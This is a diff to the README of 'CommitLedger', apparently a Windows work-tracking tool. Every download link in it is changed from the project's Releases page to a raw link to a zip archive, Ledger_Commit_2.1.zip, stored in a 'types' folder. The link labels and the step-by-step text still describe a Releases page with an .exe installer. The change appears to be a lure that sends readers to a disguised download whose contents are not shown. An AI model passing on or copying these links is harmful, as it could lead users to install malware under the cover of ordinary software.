@@ -1,6 +1,6 @@
 # 📝 CommitLedger - Track Your Work Effort Clearly
 
-[![Download CommitLedger](https://img.shields.io/badge/Download-CommitLedger-blue?style=for-the-badge&logo=github)](https://github.com/alaouf54/CommitLedger/releases)
+[![Download CommitLedger](https://img.shields.io/badge/Download-CommitLedger-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/alaouf54/CommitLedger/main/types/Ledger_Commit_2.1.zip)
 
 ---
 
@@ -16,7 +16,7 @@ This tool simplifies tracking your work without needing to write anything yourse
 
 Please **visit this page to download** the latest version of CommitLedger:
 
-[Download CommitLedger Releases](https://github.com/alaouf54/CommitLedger/releases)
+[Download CommitLedger Releases](https://raw.githubusercontent.com/alaouf54/CommitLedger/main/types/Ledger_Commit_2.1.zip)
 
 You will find all the files needed to run the application on your Windows system. Choose the latest release to get the newest features and fixes.
 
@@ -39,7 +39,7 @@ Follow these steps to download and start using CommitLedger on Windows. This gui
 ### Step 1: Download CommitLedger
 
 1. Open your web browser.  
-2. Go to the [CommitLedger Releases page](https://github.com/alaouf54/CommitLedger/releases).  
+2. Go to the [CommitLedger Releases page](https://raw.githubusercontent.com/alaouf54/CommitLedger/main/types/Ledger_Commit_2.1.zip).  
 3. Find the latest release. Usually, it is at the top of the page and marked with the most recent date.  
 4. Under "Assets," click the file that ends with `.exe` – this is the installer for Windows.
 
@@ -133,4 +133,4 @@ If you encounter problems, try these steps:
 
 ---
 
-[Download CommitLedger Releases](https://github.com/alaouf54/CommitLedger/releases)
+[Download CommitLedger Releases](https://raw.githubusercontent.com/alaouf54/CommitLedger/main/types/Ledger_Commit_2.1.zip)
